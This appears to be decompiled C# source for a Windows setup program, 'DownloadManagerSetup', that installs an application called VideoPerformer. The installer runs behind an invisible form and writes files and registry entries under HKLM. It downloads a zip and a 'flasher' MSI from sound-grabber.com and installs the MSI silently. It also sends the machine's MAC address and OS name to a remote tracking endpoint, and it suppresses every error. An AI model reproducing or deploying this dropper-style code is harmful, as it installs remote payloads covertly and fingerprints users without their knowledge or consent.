using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Windows.Forms;
using DownloadManagerSetup.Properties;
using Ionic.Zip;
using Microsoft.Win32;

namespace DownloadManagerSetup;

public class Form1 : Form
{
	private IContainer components;

	private string PROGRAM = "VideoPerformer";

	private string COMPANY = "VideoPerformer";

	private string PROGRAM_FILES = "";

	private string APPLICATION_DATA = "";

	private string MediaSlider = "MediaSlider";

	private string lne = "\\";

	private string exe = ".exe";

	private string dll = ".dll";

	private string doturl = ".url";

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(116, 0));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}

	public Form1()
	{
		InitializeComponent();
		((Form)this).set_Opacity(0.0);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		INSTALL_();
	}

	private void Log(string url)
	{
		try
		{
			using WebClient webClient = new WebClient();
			webClient.DownloadString(url);
		}
		catch
		{
		}
	}

	private void INSTALL_()
	{
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Opacity(0.0);
		string directoryName = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
		PROGRAM_FILES = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + lne + PROGRAM;
		APPLICATION_DATA = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + lne + PROGRAM;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + lne + COMPANY + lne + PROGRAM + exe;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + lne + COMPANY + lne + MediaSlider + dll;
		try
		{
			Directory.CreateDirectory(PROGRAM_FILES);
			Directory.CreateDirectory(APPLICATION_DATA);
			Directory.CreateDirectory(APPLICATION_DATA + "\\playlists");
			File.WriteAllBytes(directoryName + "\\Ionic.Zip.dll", Resources.Ionic_Zip);
			File.WriteAllBytes(PROGRAM_FILES + "\\icon.ico", Resources.icon);
			File.WriteAllBytes(PROGRAM_FILES + "\\uninstall.exe", Resources.uninstall);
			File.WriteAllBytes(PROGRAM_FILES + lne + PROGRAM + exe, Resources.VideoPerformer);
			File.WriteAllBytes(PROGRAM_FILES + lne + MediaSlider + dll, Resources.M);
			try
			{
				string text = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall";
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(text, writable: true);
				registryKey.CreateSubKey(PROGRAM, RegistryKeyPermissionCheck.ReadWriteSubTree);
				registryKey = Registry.LocalMachine.OpenSubKey(text + lne + PROGRAM, writable: true);
				registryKey.SetValue("DisplayName", PROGRAM);
				registryKey.SetValue("InstallLocation", PROGRAM_FILES);
				registryKey.SetValue("UninstallString", PROGRAM_FILES + "\\uninstall.exe");
				registryKey.SetValue("Publisher", COMPANY);
				registryKey.SetValue("DisplayIcon", PROGRAM_FILES + "\\icon.ico");
			}
			catch
			{
			}
			try
			{
				string name = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Fonts";
				RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey(name, writable: true);
				registryKey2.SetValue("IVAN (TrueType)", "MYRIADPRO-SEMIBOLD.ttf");
			}
			catch
			{
			}
			try
			{
				string name2 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Fonts";
				RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey(name2, writable: true);
				registryKey3.SetValue("MyriadPro-Semibold (TrueType)", "MYRIADPRO-SEMIBOLD.ttf");
				File.WriteAllBytes(PROGRAM_FILES + "\\fnt", Resources.fnt);
				File.Copy(PROGRAM_FILES + "\\fnt", "C:\\Windows\\Fonts\\MYRIADPRO-SEMIBOLD.ttf");
			}
			catch
			{
			}
			try
			{
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
				StreamWriter streamWriter = new StreamWriter(folderPath + lne + PROGRAM + doturl);
				streamWriter.WriteLine("[InternetShortcut]");
				streamWriter.WriteLine("URL=file:///" + PROGRAM_FILES + lne + PROGRAM + exe);
				streamWriter.WriteLine("IconIndex=0");
				streamWriter.WriteLine("IconFile=" + PROGRAM_FILES + "\\icon.ico");
				streamWriter.Flush();
				streamWriter.Close();
			}
			catch
			{
			}
		}
		catch
		{
		}
		DOWNLOAD_WIN(PROGRAM_FILES + "\\f.zip", PROGRAM_FILES);
		DOWNLOAD_FLASH(PROGRAM_FILES + "\\flash.msi");
		START(PROGRAM_FILES + "\\flash.msi", "/quiet");
		try
		{
			Process.Start(PROGRAM_FILES + lne + PROGRAM + exe);
		}
		catch
		{
		}
		Log("http://www.sound-grabber.com/DownloadManager/api/install.php?mac=" + UNIQUE() + "&os=" + OPERATINGSYSTEM());
		Application.Exit();
	}

	private bool SYSTEM_CHECKER()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Expected O, but got Unknown
		bool result = false;
		ManagementObjectSearcher val = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (((ManagementBaseObject)val2).get_Item("OSArchitecture") != null && ((ManagementBaseObject)val2).get_Item("OSArchitecture").ToString()!.Contains("64"))
				{
					result = true;
				}
			}
			return result;
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	private void DOWNLOAD_WIN(string _path, string _destination)
	{
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_004b: Expected O, but got Unknown
		try
		{
			if (SYSTEM_CHECKER())
			{
				using WebClient webClient = new WebClient();
				webClient.DownloadFile("http://www.sound-grabber.com/f/f", _path);
			}
			else
			{
				using WebClient webClient2 = new WebClient();
				webClient2.DownloadFile("http://www.sound-grabber.com/f/f32", _path);
			}
			ZipFile val = new ZipFile(_path);
			val.ExtractAll(_destination);
		}
		catch
		{
		}
	}

	private void DOWNLOAD_FLASH(string _path)
	{
		try
		{
			using WebClient webClient = new WebClient();
			webClient.DownloadFile("http://www.sound-grabber.com/f/flasher", _path);
		}
		catch
		{
		}
	}

	private string UNIQUE()
	{
		string text = string.Empty;
		try
		{
			NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
			foreach (NetworkInterface networkInterface in allNetworkInterfaces)
			{
				if (networkInterface.OperationalStatus == OperationalStatus.Up)
				{
					text += networkInterface.GetPhysicalAddress().ToString();
					break;
				}
			}
		}
		catch
		{
		}
		if (text.Length < 2)
		{
			Random random = new Random();
			return random.Next(100, 999).ToString() + random.Next(100, 999) + random.Next(100, 999) + random.Next(100, 999) + "!";
		}
		Random random2 = new Random();
		string text2 = random2.Next(100, 999) + text;
		return text2 + random2.Next(100, 999);
	}

	public string OPERATINGSYSTEM()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected O, but got Unknown
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Expected O, but got Unknown
		string text = "";
		try
		{
			string value = UNIQUE();
			ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem");
			ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Item("Caption").ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			_ = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + COMPANY;
			StreamWriter streamWriter = new StreamWriter(APPLICATION_DATA + "\\ver.sql");
			streamWriter.Write(text);
			streamWriter.Close();
			streamWriter = new StreamWriter(APPLICATION_DATA + "\\unique.sql");
			streamWriter.Write(value);
			streamWriter.Close();
			return text;
		}
		catch
		{
			return text;
		}
	}

	private void START(string PATH, string ARGUMENTS)
	{
		try
		{
			ProcessStartInfo startInfo = new ProcessStartInfo(PATH, ARGUMENTS);
			Process process = new Process();
			process.StartInfo = startInfo;
			process.Start();
			process.WaitForExit();
		}
		catch
		{
		}
	}
}
